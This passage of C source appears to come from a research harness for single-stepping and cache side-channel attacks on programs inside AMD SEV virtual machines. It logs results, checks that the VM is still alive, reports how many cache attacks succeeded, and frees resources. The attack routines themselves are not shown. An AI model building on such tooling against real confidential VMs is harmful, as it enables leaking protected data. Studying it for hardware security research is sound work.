    flf_printf("cache_log_filename_max: %ju, base_path: %s, victim_program_name: %s\n", cache_log_filename_max, base_path, victim_program_name) char *cache_log_filename = malloc(sizeof(char) * cache_log_filename_max);
    int used_chars = snprintf(cache_log_filename, cache_log_filename_max, "%s_%s", base_path, victim_program_name);
    if (used_chars < 0)
    {
        flf_printf("snprintf failed\n");
        free(cache_log_filename);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    if (cache_log_filename_max < (uint64_t)used_chars)
    {
        flf_printf("failed to create output file string\n");
        free(cache_log_filename);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    flf_printf("Writing cache_attack log to %s\n", cache_log_filename);
    if (SEV_STEP_ERR == cache_attack_log_to_file(cache_attack_log, cache_log_filename))
    {
        exit_code = HOST_CLIENT_ERROR;
        free(cache_log_filename);
        goto cleanup;
    }
    free(cache_log_filename);

    if (!finished_single_stepping_target)
    {
        printf("%s" BHRED "Did not finish target!. Wanted %lu single step events on target, got only %ju\n" reset,
               fp, victim_program_data->expected_offsets_len, single_steps_on_target);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    };

    //
    // interact with the vm to ensure that it is not stuck
    //
    bool vm_alive = false;
    for (int retries = 1; !vm_alive && retries >= 0; retries--)
    {
        victim_program_data_t *_dummy = malloc(sizeof(victim_program_data_t));
        printf("%ssending dummy request to vm to ensure that it is alive and well\n", fp);
        if (HOST_CLIENT_ERROR == vm_server_single_step_victim_init(VICTIM_PROGRAM_NOP_SLIDE, _dummy))
        {
            printf("%sdummy request " BRED "FAILED. %d retries remaining\n" reset, fp, retries);
        }
        else
        {
            vm_alive = true;
        }
        free_victim_program_data_t(_dummy);
    }

    if (vm_alive)
    {
        printf("%s VM seems to be alive and well\n", fp);
    }
    else
    {
        printf("%svm is stuck\n", fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s" BHWHT " CACHE ATTACK " reset "%ju out of %ju cache attacks succeeded\n", fp, successful_cache_attacks, cache_attack_counter);

cleanup:
    if (ev1_base_mappings != NULL)
    {
        epyc3_free_reuse_lookup_table_eviction_set(lookup_table_eviction_set, ev1_base_mappings, ev1_base_mappings_len);
    }

    flf_printf("Freeing cache attack log datastructure\n");
    cache_attack_log_free(cache_attack_log);

    if (victim_program_data != NULL)
    {
        free_victim_program_data_t(victim_program_data);
    }

    if (api_open)
    {
        printf("%s%s:%d Closing API...\n", fp, __FILE__, __LINE__);
        if (SEV_STEP_ERR == usp_close_ctx(&ctx))
        {
            printf("%s%s:%d " BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",
                   fp, __FILE__, __LINE__);
            exit_code = HOST_CLIENT_ERROR;
        }
        else
        {
            printf("%s%s:%d API closed!\n", fp, __FILE__, __LINE__);
        }
    }

    return exit_code;
}

#endif